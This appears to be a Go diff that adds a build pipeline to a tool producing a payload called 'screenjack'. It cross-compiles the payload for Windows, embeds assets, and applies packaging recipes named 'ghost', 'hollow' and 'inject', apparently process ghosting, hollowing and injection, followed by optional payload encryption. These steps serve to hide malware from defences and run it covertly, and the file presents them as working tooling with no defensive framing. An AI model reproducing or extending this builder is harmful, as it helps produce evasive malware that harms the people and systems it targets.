@@ -1,7 +1,11 @@
 package main
 
 import (
+	"context"
+	"fmt"
+	"os/exec"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -226,4 +230,135 @@ func (m buildCompleteMsg) toResult() BuildResult {
 		Partial: !allOK && anyOK,
 		Summary: strings.Join(parts, ", "),
 	}
+}
+
+// StartBuild launches parallel builds for all targets in job
+func StartBuild(ctx context.Context, job *BuildJob, progressCh chan<- TargetProgress, logCh chan<- string) <-chan buildCompleteMsg {
+	doneCh := make(chan buildCompleteMsg, 1)
+
+	go func() {
+		var wg sync.WaitGroup
+		results := make([]TargetProgress, len(job.Targets))
+		var mu sync.Mutex
+
+		for i, target := range job.Targets {
+			wg.Add(1)
+			go func(idx int, tgt string) {
+				defer wg.Done()
+				result := buildTarget(ctx, tgt, job, progressCh, logCh)
+				mu.Lock()
+				results[idx] = result
+				mu.Unlock()
+			}(i, target)
+		}
+
+		wg.Wait()
+
+		doneCh <- buildCompleteMsg{
+			Results:   results,
+			Cancelled: ctx.Err() != nil,
+		}
+		close(doneCh)
+	}()
+
+	return doneCh
+}
+
+// buildTarget builds a single target with platform-appropriate options
+func buildTarget(ctx context.Context, target string, job *BuildJob, progressCh chan<- TargetProgress, logCh chan<- string) TargetProgress {
+	progress := TargetProgress{Target: target, Phase: "compiling"}
+	progressCh <- progress
+
+	// Determine cargo target
+	cargoTarget := ""
+	if target == "windows" || target == "x86_64-pc-windows-gnu" {
+		cargoTarget = "x86_64-pc-windows-gnu"
+	}
+
+	// Build base payload
+	args := []string{"build", "--release"}
+	if cargoTarget != "" {
+		args = append(args, "--target", cargoTarget)
+	}
+	if job.EmbedAsset && job.Asset != "" {
+		args = append(args, "--features", "embedded")
+	}
+
+	logCh <- fmt.Sprintf("[%s] cargo %s", target, strings.Join(args, " "))
+
+	cmd := exec.CommandContext(ctx, "cargo", args...)
+	cmd.Dir = "../payload"
+
+	// Set env for embedded asset
+	if job.EmbedAsset && job.Asset != "" {
+		cmd.Env = append(cmd.Environ(), "SCREENJACK_ASSET="+job.Asset)
+	}
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		if ctx.Err() != nil {
+			progress.Phase = "cancelled"
+			progress.Error = "cancelled"
+		} else {
+			progress.Phase = "failed"
+			progress.Error = err.Error()
+			logCh <- fmt.Sprintf("[%s] ERROR: %s", target, string(output))
+		}
+		progress.Done = true
+		progressCh <- progress
+		return progress
+	}
+
+	logCh <- fmt.Sprintf("[%s] Compiled successfully", target)
+
+	// Apply packaging steps based on filtered options
+	opts := optionsForTarget(target, &job.PkgConfig)
+
+	if (target == "windows" || target == "x86_64-pc-windows-gnu") && opts.ExecMethod > 0 {
+		progress.Phase = "packaging"
+		progressCh <- progress
+
+		payloadPath := "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
+
+		// Apply execution method
+		var recipe string
+		switch opts.ExecMethod {
+		case 1:
+			recipe = "ghost"
+		case 2:
+			recipe = "hollow"
+		case 4:
+			recipe = "inject"
+		}
+		if recipe != "" {
+			logCh <- fmt.Sprintf("[%s] Applying %s...", target, recipe)
+			pkgCmd := exec.CommandContext(ctx, "just", "-f", "package.just", recipe, payloadPath)
+			pkgCmd.Dir = ".."
+			if out, err := pkgCmd.CombinedOutput(); err != nil {
+				logCh <- fmt.Sprintf("[%s] Package warning: %s", target, string(out))
+			}
+		}
+	}
+
+	// Apply encryption if selected
+	if opts.Encrypt {
+		progress.Phase = "encrypting"
+		progressCh <- progress
+		logCh <- fmt.Sprintf("[%s] Encrypting payload...", target)
+
+		payloadPath := "../payload/target/release/screenjack"
+		if target == "windows" || target == "x86_64-pc-windows-gnu" {
+			payloadPath = "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
+		}
+		encCmd := exec.CommandContext(ctx, "just", "-f", "package.just", "encrypt", payloadPath)
+		encCmd.Dir = ".."
+		if out, err := encCmd.CombinedOutput(); err != nil {
+			logCh <- fmt.Sprintf("[%s] Encrypt warning: %s", target, string(out))
+		}
+	}
+
+	progress.Phase = "done"
+	progress.Done = true
+	progressCh <- progress
+	return progress
 }
